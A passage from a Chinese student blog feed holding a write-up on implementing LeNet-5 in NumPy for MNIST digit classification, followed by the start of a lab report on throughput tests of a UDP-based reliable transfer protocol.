class="hljs-number">5</span>, <span class="hljs-number">120</span>)        self.relu3 = layers.ReLu()        self.fc2 = layers.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)        self.relu4 = layers.ReLu()        self.fc3 = layers.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">10</span>)</code></pre></div></div><h3 id="代码细节">代码细节</h3><h4 id="准备工作">准备工作</h4><p>代码整体仿照Pytorch的形式进行编写，但由于没有Pytorch的自动求导机制，反向传播与参数更新方面必然与其有所差距。</p><p>首先进行数据获取和处理，定义模型和优化器：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ydj71ulluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-ydj71ulluwpkzu"><pre><code class="hljs python">model = MyLeNet5()mnist_train = datasets.MNIST(<span class="hljs-string">'./data/MNIST/raw'</span>, train=<span class="hljs-literal">True</span>)mnist_test = datasets.MNIST(<span class="hljs-string">'./data/MNIST/raw'</span>, train=<span class="hljs-literal">False</span>)mnist_train, mnist_val = split(mnist_train, [<span class="hljs-number">54000</span>, <span class="hljs-number">6000</span>])train_loader = DataLoader(mnist_train, batch_size=<span class="hljs-number">120</span>, shuffle=<span class="hljs-literal">True</span>)val_loader = DataLoader(mnist_val, batch_size=<span class="hljs-number">120</span>, shuffle=<span class="hljs-literal">False</span>)test_loader = DataLoader(mnist_test, batch_size=<span class="hljs-number">1</span>, shuffle=<span class="hljs-literal">False</span>)loss_fn = loss.CrossEntropyLoss()optimizer = optim.Adam(lr=<span class="hljs-number">1e-3</span>)</code></pre></div></div><p>与Pytorch类似，DataLoader实现了迭代器，如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q5il3ylluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-q5il3ylluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_batches):        batch_indices = self.indices[i * self.batch_size:(i + <span class="hljs-number">1</span>) * self.batch_size]        batch_data = self.data[batch_indices]        batch_labels = self.labels[batch_indices]        <span class="hljs-keyword">yield</span> batch_data, batch_labels</code></pre></div></div><p>交叉熵损失函数如下所示。为避免取对数时数据过小除0，将预测数据过一遍softmax进行归一化：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5llys5lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-5llys5lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CrossEntropyLoss</span>(<span class="hljs-title class_ inherited__">object</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):        self.<span class="hljs-built_in">input</span> = <span class="hljs-literal">None</span>        self.output = <span class="hljs-literal">None</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, y_pred, y</span>):        <span class="hljs-comment"># y_pred: (N, C_out)</span>        <span class="hljs-comment"># y: (N, 1)</span>        <span class="hljs-comment"># N = y_pred.shape[0]</span>        <span class="hljs-comment"># self.input = y_pred</span>        <span class="hljs-comment"># self.output = np.mean(-np.log(y_pred[range(N), list(y)]))</span>        <span class="hljs-comment"># grad = y_pred</span>        <span class="hljs-comment"># grad[range(N), list(y)] -= 1</span>        <span class="hljs-comment"># grad /= N</span>        <span class="hljs-comment"># return self.output, grad</span>        N = y_pred.shape[<span class="hljs-number">0</span>]        ex = np.exp(y_pred)        sumx = np.<span class="hljs-built_in">sum</span>(ex, axis=<span class="hljs-number">1</span>)        loss = np.mean(np.log(sumx)-y_pred[<span class="hljs-built_in">range</span>(N), <span class="hljs-built_in">list</span>(y)])        grad = ex/sumx.reshape(N, <span class="hljs-number">1</span>)        grad[<span class="hljs-built_in">range</span>(N), <span class="hljs-built_in">list</span>(y)] -= <span class="hljs-number">1</span>        grad /= N        <span class="hljs-keyword">return</span> loss, grad</code></pre></div></div><p>优化算法上，论文中使用的是随机梯度下降算法，为加快收敛速度，对当前流行的Adam算法进行了学习和实现。</p><p>Adam是2015年提出的新方法。它的理论有些复杂，直观地讲，就是融合了Momentum和AdaGrad的方法，也就是说，结合“速度”和“加速度”进行方向向量判断，同时具有AdaGrad学习率递减的特征。通过组合前面两个方法的优点，有望实现参数空间的高效搜索。此外，进行超参数的“偏置校正”也是Adam的特征。</p><p>首先计算历史梯度的一阶指数平滑值，用于得到带有动量的梯度值 <span class="math display">\[m_t=\beta_1^t m_{t-1}+\left(1-\beta_1^t\right) g\]</span>然后计算历史梯度平方的一阶指数平滑值，用于得到每个权重参数的学习率权重参数<span class="math display">\[v_t=\beta_2^t v_{t-1}+\left(1-\beta_2^t\right) g^2\]</span> 对一阶和二阶动量做偏置校正 <span class="math display">\[\begin{aligned}\hat{m}_t &amp; =\frac{m_t}{1-\beta_1^t} \\\hat{v}_t &amp; =\frac{v_t}{1-\beta_2^t}\end{aligned}\]</span>最后计算变量更新值，变量更新值正比于历史梯度的一阶指数平滑值，反比于历史梯度平方的一阶指数平滑值<span class="math display">\[\theta=\theta_{t-1}-\frac{\alpha \hat{m}_t}{\sqrt{\hat{v}_t}+\epsilon}\]</span> Adam会设置 3个超参数。一个是学习率（论文中以α出现），另外两个是一次momentum系数β1和二次momentum系数<span class="math inline">\(β2\)</span>。根据论文， 标准的设定值是<span class="math inline">\(β1\)</span>为 0.9，<span class="math inline">\(β2\)</span> 为 0.999。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r4770hlluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-r4770hlluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self, params</span>):    vals = params[<span class="hljs-number">0</span>]    grads = params[<span class="hljs-number">1</span>]    <span class="hljs-keyword">if</span> self.m <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        self.m, self.v = [], []        <span class="hljs-keyword">for</span> param, grad <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(vals, grads):            self.m.append(np.zeros_like(param))            self.v.append(np.zeros_like(grad))    self.<span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span>    lr_t = self.lr * np.sqrt(<span class="hljs-number">1.0</span> - self.beta2 ** self.<span class="hljs-built_in">iter</span>) / (<span class="hljs-number">1.0</span> - self.beta1 ** self.<span class="hljs-built_in">iter</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(vals)):        self.m[i] += (<span class="hljs-number">1</span> - self.beta1) * (grads[i] - self.m[i])        self.v[i] += (<span class="hljs-number">1</span> - self.beta2) * (grads[i] ** <span class="hljs-number">2</span> - self.v[i])        vals[i] -= lr_t * self.m[i] / (np.sqrt(self.v[i]) + <span class="hljs-number">1e-7</span>)    <span class="hljs-keyword">return</span> vals</code></pre></div></div><p><span class="math inline">\(\epsilon\)</span>的设置同样是为了防止<span class="math inline">\(\sqrt{\hat{v}_t}\)</span>过小进行除零运算。代码中将其设为1e-7。</p><h3 id="模型实现">模型实现</h3><p><code>layer.py</code>中定义基类<code>layer</code>，各种层均由其继承得来。</p><h3 id="卷积层">卷积层</h3><p>由于Lenet5中除第一层外不涉及padding和stride不等于1的情况，因此很多地方可以简化实现，加快迭代速度。</p><p>其前向传播的运算如下 <span class="math display">\[\mathbf{Y}=\mathbf{x} \otimes \mathbf{W}+\mathbf{b}\]</span>我们可以通过<code>im2col</code>来进行优化，将卷积运算转化为矩阵相乘。<a href="https://www.researchgate.net/publication/332186100_DeLTA_GPU_Performance_Model_for_Deep_Learning_Applications_with_In-depth_Memory_System_Traffic_Analysis">这篇论文</a>中对<code>im2col</code>实现的排布方式进行了非常直观的展示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210832783559_268_20230305200446840095_839_image-20230108225739278.png" alt="image-20230108225739278" width="80%" height="80%"></p><p>其中<span class="math inline">\(C_i\)</span>为输入通道个数，图中为3。<span class="math inline">\(C_o\)</span>为输出通道个数，图中为2。<span class="math inline">\(H_0\)</span>和<span class="math inline">\(W_0\)</span>代表卷积后输出图像的高和宽，对应于文中第一张图中的<span class="math inline">\(OH\)</span>和<span class="math inline">\(OW\)</span> <span class="math display">\[\begin{aligned}O H &amp; =\frac{H+2 P-F H}{S}+1 \\O W &amp; =\frac{W+2 P-F W}{S}+1\end{aligned}\]</span> 本实验中$O H =H-FH+1 <span class="math inline">\(，\)</span>OW =W-FW+1 $。代码实现可如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f23ei5lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-f23ei5lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">im2col</span>(<span class="hljs-params">img, filter_h, filter_w, out_H, out_W</span>):    N, C, H, W = img.shape    col = np.zeros((N * out_H * out_W, C * filter_h * filter_w))    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_H):        y_start = y * out_W        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_W):            col[y_start + x::out_H * out_W, :] = img[:, :, y:y + filter_h, x:x + filter_w].reshape(N, -<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> col</code></pre></div></div><p>内层循环执行一次，滤波器覆盖的区域被展成“长条”，放到<code>col</code>的对应位置，比如第一次执行内层循环，上图的红黄蓝三条<code>l0 l1 l3 l4</code>均就位。</p><p>另外《深度学习入门：基于Python的理论与实现》中有另外一种实现，避免了步长的切片，数据访问局部性更好。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qxsh6qlluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-qxsh6qlluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">im2col</span>(<span class="hljs-params">img, filter_h, filter_w, out_H, out_W</span>):    N, C, H, W = img.shape    col = np.zeros((N, C, filter_h, filter_w, out_H, out_W))    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(filter_h):        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(filter_w):            col[:, :, h, w, :, :] = img[:, :, h:h + out_H, w:w + out_W]    col = col.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>).reshape(N * out_H * out_W, -<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> col</code></pre></div></div><p>整个前向传播的实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9r85b7lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-9r85b7lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):    N, C, H, W = X.shape    out_H = H - self.filter_size + <span class="hljs-number">1</span>    out_W = W - self.filter_size + <span class="hljs-number">1</span>    <span class="hljs-comment"># use im2col to convert input to column</span>    col = im2col(X, self.filter_size, self.filter_size, out_H, out_W)    col_W = self.W.reshape(self.out_channels, -<span class="hljs-number">1</span>).T    <span class="hljs-comment"># thus we can use matrix multiplication to calculate output</span>    out = np.dot(col, col_W) + self.b    out = out.reshape(N, out_H, out_W, -<span class="hljs-number">1</span>).transpose(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    self.X = X    self.col = col    self.col_W = col_W    <span class="hljs-keyword">return</span> out</code></pre></div></div><p>对于反向传播，可以通过下面简单的例子进行理解：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210834019523_589_20230305200448882525_978_image-20230108223119000.png" alt="image-20230108223119000" width="50%" height="50%"></p><p>列出 <span class="math inline">\(a ， W ， z\)</span>的矩阵表达式如下: <span class="math display">\[\left[\begin{array}{ll}z_{11} &amp; z_{12} \\z_{21} &amp; z_{22}\end{array}\right]=\left[\begin{array}{lll}a_{11} &amp; a_{12} &amp; a_{13} \\a_{21} &amp; a_{22} &amp; a_{23} \\a_{31} &amp; a_{32} &amp; a_{33}\end{array}\right] *\left[\begin{array}{cc}w_{11} &amp; w_{12} \\w_{21} &amp; w_{22}\end{array}\right]\]</span> 利用卷积的定义，很容易得出: <span class="math display">\[\begin{aligned}&amp; z_{11}=a_{11} w_{11}+a_{12} w_{12}+a_{21} w_{21}+a_{22} w_{22} \\&amp; z_{12}=a_{12} w_{11}+a_{13} w_{12}+a_{22} w_{21}+a_{23} w_{22} \\&amp; z_{21}=a_{21} w_{11}+a_{22} w_{12}+a_{31} w_{21}+a_{32} w_{22} \\&amp; z_{22}=a_{22} w_{11}+a_{23} w_{12}+a_{32} w_{21}+a_{33} w_{22}\end{aligned}\]</span></p><p>比如求损失函数 <span class="math inline">\(J\)</span> 对 <span class="math inline">\(a_{11}\)</span> 的梯度: <span class="math display">\[\frac{\partial J}{\partial a_{11}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{11}}=\delta_{z 11} \cdot w_{11}\]</span> 上式中， <span class="math inline">\(\delta_{z 11}\)</span>是从网络后端回传到本层的 <span class="math inline">\(z_{11}\)</span>单元的梯度。 求 <span class="math inline">\(J\)</span> 对 <span class="math inline">\(a_{12}\)</span> 的梯度 <span class="math inline">\(a_{12}\)</span> 对 <span class="math inline">\(z_{11}\)</span> 和 <span class="math inline">\(z_{12}\)</span> 都有贡献，二者的偏导数相加： <span class="math display">\[\frac{\partial J}{\partial a_{12}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{12}}+\frac{\partial J}{\partialz_{12}} \frac{\partial z_{12}}{\partial a_{12}}=\delta_{z 11} \cdotw_{12}+\delta_{z 12} \cdot w_{11}\]</span> <span class="math display">\[\frac{\partial J}{\partial a_{22}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{22}}+\frac{\partial J}{\partialz_{12}} \frac{\partial z_{12}}{\partial a_{22}}+\frac{\partialJ}{\partial z_{21}} \frac{\partial z_{21}}{\partiala_{22}}+\frac{\partial J}{\partial z_{22}} \frac{\partialz_{22}}{\partial a_{22}} =\delta_{z 11} \cdot w_{22}+\delta_{z 12} \cdotw_{21}+\delta_{z 21} \cdot w_{12}+\delta_{z 22} \cdot w_{11}\]</span> 同理可得所有 <span class="math inline">\(a\)</span>的梯度。</p><p>观察公式，可以发现把原始的卷积核旋转了180度，再与传入误差项做卷积操作，即可得到所有元素的误差项。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210835040764_715_20230305200450427910_422_image-20230108223730899.png" alt="image-20230108223730899" width="50%" height="50%"></p><p>可以得到 <span class="math display">\[\delta_{\text {out }}=\delta_{\text {in }} * W^{\text {rot180 }}\]</span></p><p>同样的道理，对<span class="math inline">\(\mathbf{W}\)</span>和<span class="math inline">\(\mathbf{b}\)</span>分别求偏导，可以得到：</p><p><span class="math display">\[\begin{gathered}\operatorname{\delta}_{\mathbf{W}}=\mathbf{X} \otimes \delta_{\text {in}} \\\operatorname{\delta}_{\mathbf{b}}=\sum \delta_{\text {in }}\end{gathered}\]</span> 代码中用<code>back_grad</code>指代<span class="math inline">\(\delta_{\text {in}}\)</span>,表示从后面的层反向传播过来的梯度。</p><p>同时结合<code>im2col</code>的逆操作，代码可如下实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ybxv7ylluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-ybxv7ylluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    FN, C, FH, FW = self.W.shape    back_grad = back_grad.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>).reshape(-<span class="hljs-number">1</span>, FN)    self.db = np.<span class="hljs-built_in">sum</span>(back_grad, axis=<span class="hljs-number">0</span>)    self.dW = np.dot(self.col.T, back_grad)    self.dW = self.dW.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>).reshape(FN, C, FH, FW)    dcol = np.dot(back_grad, self.col_W.T)    dx = col2im(dcol, self.X.shape, FH, FW)    <span class="hljs-keyword">return</span> dx</code></pre></div></div><p>其中<code>col2im</code>作如下实现，道理和<code>im2col</code>类似，不再赘述。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-si30r3lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-si30r3lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">col2im</span>(<span class="hljs-params">col, input_shape, filter_h, filter_w</span>):    N, C, H, W = input_shape    out_H = H - filter_h + <span class="hljs-number">1</span>    out_W = W - filter_w + <span class="hljs-number">1</span>    img = np.zeros((N, C, H, W))    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_H):        y_start = y * out_W        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_W):            img[:, :, y:y + filter_h, x:x + filter_w] += col[y_start + x::out_H * out_W, :].reshape(N, C, filter_h,                                                                                                    filter_w)    <span class="hljs-keyword">return</span> img</code></pre></div></div><h3 id="池化层">池化层</h3><p>在本次实验中，池化层采用了最大池化的方式，即通过滤波器筛选出最大的元素作为池化结果。反向传播时只有被选择为最大值的元素位置对应会被梯度反向传播，其余的位置都赋值为0。</p><p>反向传播也可以通过<code>im2col</code>实现，不过可以利用掩码达到类似的加速效果，且比<code>col2im</code>快。</p><p><code>col2im</code>方法：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6vkwi8lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-6vkwi8lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    back_grad = back_grad.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)    pool_size = self.pool_H * self.pool_W    dmax = np.zeros((back_grad.size, pool_size))    dmax[np.arange(self.arg_max.size), self.arg_max.flatten()] = back_grad.flatten()    dmax = dmax.reshape(back_grad.shape + (pool_size,))    dcol = dmax.reshape(dmax.shape[<span class="hljs-number">0</span>] * dmax.shape[<span class="hljs-number">1</span>] * dmax.shape[<span class="hljs-number">2</span>], -<span class="hljs-number">1</span>)    dx = col2im(dcol, self.X.shape, self.pool_H, self.pool_W)    <span class="hljs-keyword">return</span> dx</code></pre></div></div><p><code>mask</code>方法：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-52vh33lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-52vh33lluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    h_size = self.pool_H    w_size = self.pool_W    N, C, H, W = self.X.shape    output_H = H // h_size    output_W = W // w_size    grad = np.zeros_like(self.X)    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(output_H):        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(output_W):            tmp_x = self.X[:, :, h * h_size:(h + <span class="hljs-number">1</span>) * h_size, w * w_size:(w + <span class="hljs-number">1</span>) * w_size].reshape((N, C, -<span class="hljs-number">1</span>))            mask = np.zeros((N, C, h_size * w_size))            mask[np.arange(N)[:, <span class="hljs-literal">None</span>], np.arange(C)[<span class="hljs-literal">None</span>, :], np.argmax(tmp_x, axis=<span class="hljs-number">2</span>)] = <span class="hljs-number">1</span>            grad[:, :, h * h_size:(h + <span class="hljs-number">1</span>) * h_size, w * w_size:(w + <span class="hljs-number">1</span>) * w_size] = mask.reshape(                (N, C, h_size, w_size)) * back_grad[:, :, h, w][:, :, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]    <span class="hljs-keyword">return</span> grad</code></pre></div></div><h3 id="全连接层">全连接层</h3><p>全连接层与正常的神经网络基本相同。正向传播就是正常的线性变换，反向传播在实际实现时使用计算图的思想理解比较容易，比如下面是3节点层和2节点层反向传播的示意图：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210836169019_246_20230305200451954546_926_image-20230108232916872.png" alt="image-20230108232916872"><figcaption aria-hidden="true">image-20230108232916872</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pr4l4wlluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-pr4l4wlluwpkzu"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Linear</span>(<span class="hljs-title class_ inherited__">Layer</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_size, output_size</span>):        <span class="hljs-built_in">super</span>().__init__()        self.<span class="hljs-built_in">input</span> = <span class="hljs-literal">None</span>        self.output = <span class="hljs-literal">None</span>        <span class="hljs-comment"># use "He" initialization</span>        <span class="hljs-comment"># self.W = np.random.randn(input_size, output_size) * np.sqrt(2 / input_size)</span>        <span class="hljs-comment"># use normal distribution initialization</span>        self.W = np.random.normal(scale=<span class="hljs-number">1e-3</span>, size=(input_size, output_size))        self.b = np.zeros(output_size)        self.dW = np.zeros((input_size, output_size))        self.db = np.zeros(output_size)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):        self.<span class="hljs-built_in">input</span> = X.copy()        self.output = np.dot(self.<span class="hljs-built_in">input</span>, self.W) + self.b        <span class="hljs-keyword">return</span> self.output    <span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):        self.dW = np.dot(self.<span class="hljs-built_in">input</span>.T, back_grad)        self.db = np.<span class="hljs-built_in">sum</span>(back_grad, axis=<span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> np.dot(back_grad, self.W.T)</code></pre></div></div><h2 id="实验结果">实验结果</h2><h4 id="实验环境">实验环境</h4><p>python3.8，依赖numpy及matplotlib。</p><h4 id="运行结果及分析">运行结果及分析</h4><p>使用54000个数据作为训练集，6000个数据作为验证集，Adam的学习率设置为1e-3。执行20个epoch得到的结果，测试集准确率为98.27%。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210837132026_873_20230305200453760864_136_image-20230108234919998.png" alt="image-20230108234919998" width="80%" height="80%"></p><p>从验证集及损失函数看，模型比较有效的学得了训练集上的参数，且训练集和测试集的正确率同步上升，未发生明显的过拟合。由于并没有对模型进行更细致的参数调优或组合，和LeCun论文中的 99.27%仍有微小的差距。</p><p>同时还打印出了错误分类的样本及其标签，左边为标签，右边为错误预测。可以看到，这些样本很多都比较“奇怪”，即使人来粗看也非常容易犯错。比如右下角的2，本身写的就很难与1分辨开来，一定程度上也说明模型对相似度的正确判断。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210837983994_639_20230305200455107633_269_image-20230108234646628.png" alt="image-20230108234646628"><figcaption aria-hidden="true">image-20230108234646628</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.4-基于UDP服务设计可靠传输协议(性能测试)</title>
    <link href="/posts/55174/"/>
    <url>/posts/55174/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.4-基于udp服务设计可靠传输协议性能测试">计算机网络实验3.4-基于UDP服务设计可靠传输协议(性能测试)</h1><h2 id="实验要求">实验要求</h2><p>基于给定的实验测试环境，通过改变延迟时间和丢包率，完成下面3组性能对比实验：</p><p>（1）停等机制与滑动窗口机制性能对比；</p><p>（2）滑动窗口机制中不同窗口大小对性能的影响；</p><p>（3）有拥塞控制和无拥塞控制的性能比较。</p><ul><li><p>控制变量法；</p></li><li><p>性能测试指标：吞吐率、时延，给出图形结果并进行分析。</p></li></ul><h2 id="实验环境及测试流程">实验环境及测试流程</h2><p>Windows 10 MinGW w64 9.0</p><p>协议设计等可参见<a href="https://lunaticsky-tql.github.io/posts/24837/">lab3.1</a></p><p>测试中发现，输出中间信息（如窗口大小丢包信息等）会显著影响传输时间，传输时间较短时更为明显。同时不同的实现输出的内容和数量也不一致。因此下面的性能测试中均去除了传输过程中所有输出信息。</p><p>每组数据测量三次，取平均值。</p><p>经测试，吞吐率与文件类型无明显关联。故所有测试均使用提供的<code>helloworld.txt</code>，文件大小1552320字节。所有测试与吞吐率相关指标均用该文件净传输时间表示。</p><p>吞吐率可计算如下：</p><p><code>Throughput rate=(double)file_len*1000/(timer_end-timer_start)) B/s</code></p><h2 id="性能测试">性能测试</h2><h3 id="停等协议滑动窗口">停等协议&amp;滑动窗口</h3><h4 id="停等协议">停等协议</h4><p>停等协议下，改变丢包率和延时测得数据如下所示（单位：ms）：</p><table><thead><tr class="header"><th>丢包率</th><th>0</th><th>1</th><th>2</th><th>3</th><th>50</th></tr></thead><tbody><tr class="odd"><td>0%</td><td>1209</td><td>24553</td><td>28056</td><td>31249</td><td>117252</td></tr><tr class="even"><td>1%</td><td>34148</td><td>63867</td><td>65102</td><td>66329</td><td></td></tr><tr class="odd"><td>9%</td><td>190942</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205751344676_212_20221230235944988658_534_image-20221230215825119.png" width="80%" height="80%"></p><p>可以从数据中初步探索延迟和丢包率对传输时间的影响力度。</p><h4 id="滑动窗口">滑动窗口</h4><h5 id="gbn">GBN</h5><p>在窗口大小为10，超时时间为1s时，测得数据如下所示（单位：ms）：</p><table><thead><tr class="header"><th>丢包率</th><th>0</th><th>1</th><th>2</th><th>3</th><th>50</th></tr></thead><tbody><tr class="odd"><td>0%</td><td>1301</td><td>29799</td><td>32112</td><td>39832</td><td>115665</td></tr><tr class="even"><td>1%</td><td>37429</td><td>69002</td><td>75104</td><td>78379</td><td></td></tr><tr class="odd"><td>9%</td><td>250775</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205752463313_619_20221230235945954601_749_image-20221230215757564.png" alt="image-20221230215757564" width="80%" height="80%"></p><p>可以看到，在实验环境下，GBN的整体表现甚至不如停等协议，即便是没有丢包和延时的条件下也是如此。猜测在实验条件下传输速度主要取决于接收端的接收速度。即使发送端可以“并行”发送，但由于接收端仍然需要等待和停等协议接近相同的超时时间接收丢失的包，因此传输速度并没有相差多少，反而由于GBN使得接收方不得不处理失序的包，从而耽误了更多的一些时间。</p><p>同时也在实验中尝试在接收端对两次收包的间隔进行计时，发现丢包率设为0%时间隔仅为1-2ms，而仅仅将丢包率设为1%，延时仍为0s的前提下，正常接收（不涉及丢包时）的时延达9-15ms不等。猜测这个现象与路由器程序的实现有关。因此，0/0%的高吞吐率实际上在这个实验中并没有参考价值。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nvdrwylluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-nvdrwylluwpkzv"><pre><code class="hljs c++"><span class="hljs-comment">//"blocking" receive here</span><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    